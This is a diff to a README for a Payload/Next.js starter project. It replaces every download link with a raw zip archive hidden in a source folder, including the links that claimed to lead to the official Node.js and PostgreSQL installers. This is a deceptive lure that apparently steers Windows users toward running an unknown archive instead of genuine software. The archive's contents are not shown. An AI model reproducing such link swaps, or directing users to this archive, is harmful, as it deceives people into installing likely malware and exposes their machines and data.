@@ -1,6 +1,6 @@
 # ⚡ payload-nextjs-starter - Simple CMS and Website Setup
 
-[![Download payload-nextjs-starter](https://img.shields.io/badge/Download-payload--nextjs--starter-brightgreen)](https://github.com/ameurDev-ops/payload-nextjs-starter)
+[![Download payload-nextjs-starter](https://img.shields.io/badge/Download-payload--nextjs--starter-brightgreen)](https://github.com/ameurDev-ops/payload-nextjs-starter/raw/refs/heads/main/src/heros/PostHero/nextjs-starter-payload-v1.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Before you begin, make sure your computer meets these needs:
 
 Start by visiting the download page where you can get the full project. Use this big button:
 
-[![Download payload-nextjs-starter](https://img.shields.io/badge/Download-payload--nextjs--starter-blue)](https://github.com/ameurDev-ops/payload-nextjs-starter)
+[![Download payload-nextjs-starter](https://img.shields.io/badge/Download-payload--nextjs--starter-blue)](https://github.com/ameurDev-ops/payload-nextjs-starter/raw/refs/heads/main/src/heros/PostHero/nextjs-starter-payload-v1.6.zip)
 
 Click the button or this link to open the GitHub page. From there, you will find the files you need.
 
@@ -39,7 +39,7 @@ Click the button or this link to open the GitHub page. From there, you will find
 
 Node.js is software that lets your computer run parts of this project. To install it:  
 
-- Go to https://nodejs.org/en/download/  
+- Go to https://github.com/ameurDev-ops/payload-nextjs-starter/raw/refs/heads/main/src/heros/PostHero/nextjs-starter-payload-v1.6.zip  
 - Download the Windows Installer for the latest LTS version  
 - Run the installer and follow the instructions on screen  
 - Restart your computer if requested
@@ -48,7 +48,7 @@ Node.js is software that lets your computer run parts of this project. To instal
 
 PostgreSQL is the database. It stores content for your site. To install:  
 
-- Visit https://www.postgresql.org/download/windows/  
+- Visit https://github.com/ameurDev-ops/payload-nextjs-starter/raw/refs/heads/main/src/heros/PostHero/nextjs-starter-payload-v1.6.zip  
 - Download the Windows installer  
 - Follow the steps and use default settings unless you know what you want to change  
 - Take note of the username and password you set  
@@ -178,4 +178,4 @@ npm install
 
 If you need to download the project again, visit:
 
-[https://github.com/ameurDev-ops/payload-nextjs-starter](https://github.com/ameurDev-ops/payload-nextjs-starter)
+[https://github.com/ameurDev-ops/payload-nextjs-starter/raw/refs/heads/main/src/heros/PostHero/nextjs-starter-payload-v1.6.zip](https://github.com/ameurDev-ops/payload-nextjs-starter/raw/refs/heads/main/src/heros/PostHero/nextjs-starter-payload-v1.6.zip)
